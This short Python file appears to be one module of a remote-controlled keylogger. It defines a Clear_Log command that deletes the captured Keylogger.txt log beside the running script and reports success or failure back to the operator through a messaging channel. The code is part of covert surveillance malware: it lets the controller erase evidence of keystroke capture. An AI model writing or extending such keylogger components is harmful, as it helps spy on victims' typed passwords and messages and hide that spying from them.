import os, sys
class Clear_Log():
	def __init__(self, _):
		self.Send_Message = _.Send_Message
		self.Main()

	def Main(self):
		filename = os.path.dirname(os.path.abspath(sys.argv[0])) + "\\Keylogger.txt"
		if os.path.exists(filename):
			os.remove(filename)
			self.Send_Message.Send("%E2%9C%94%EF%B8%8F Keylogger Log Deleted")
		else:
			self.Send_Message.Send("%E2%9C%96%EF%B8%8F Log File Not Exists")
